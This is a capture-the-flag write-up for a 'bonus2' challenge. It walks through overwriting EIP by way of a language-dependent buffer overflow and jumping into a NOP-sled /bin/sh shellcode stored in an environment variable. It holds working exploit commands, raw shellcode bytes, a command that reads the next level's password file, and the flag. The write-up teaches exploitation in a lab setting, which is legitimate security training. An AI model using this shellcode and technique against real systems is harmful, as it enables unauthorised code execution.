# bonus2

The executable does the following :

- Write 40 bytes of `av[1]` into a buffer
- Write 32 bytes of `av[2]` into buffer+40
- Use `getenv("LANG")` to get an environment variable and set the `_language` global
- Sets `s` according to language, concatenates our buffer and prints it

With no function to call or function pointer, we'll use `eip` to point to a shellcode.

## **Overwriting EIP**

We start by running the executable in `gdb` with filled args :

```
gdb --args bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
```

We find something interesting : the program segfaults trying to access `0x08004242`.

We recognize our `B`'s on the last two bytes ; this means our full buffers can only overwrite two bytes of `eip`. Could we go a little further ?

We notice, by default, the program concatenates `"Hello "` with our buffer. But there are other options - *longer* options. We try setting another language with the env variable :

```
env -i LANG=nl gdb --args bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
```

The program tries to access `0x42424242` ; we've managed to overwrite `eip`.

We experiment a bit and find `eip` starts at the second buffer's 24th byte. We write :

```
env -i LANG=nl gdb --args bonus2 $(python -c 'print("A" * 40)') $(python -c 'print("A" * 23 + "\xff\xff\xff\xff")')
```

The program tries to access `0xffffffff` ; we control `eip`.

## **The shellcode**

The program runs a `memcpy` that doesn't like if we put the shellcode in our buffer ; no problem, we'll just use the `env` table again.

We add a shellcode and run the following :

```
env -i \
LANG=nl \
SHELLCODE=$(python -c 'print("\x90" * 512 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh")') \
gdb --args bonus2 \
$(python -c 'print("A" * 40)') \
$(python -c 'print("A" * 23 + "\xff\xff\xff\xff")')
```

We skim through the memory and find our shellcode's nopesled spans between `0xbffffdb5` and `0xbfffffb5`.

We target the midpoint, `0xbffffeb5`.

## **The command**

We run the following :

```
env -i \
LANG=nl \
SHELLCODE=$(python -c 'print("\x90" * 512 + "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh")') \
./bonus2 \
$(python -c 'print("A" * 40)') \
$(python -c 'print("A" * 23 + "\xb5\xfe\xff\xbf")')
```

## **The flag**

It works ! In the interactive shell, we run :

```
cat /home/user/bonus3/.pass
```

We get the flag for `bonus2` :

```
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
```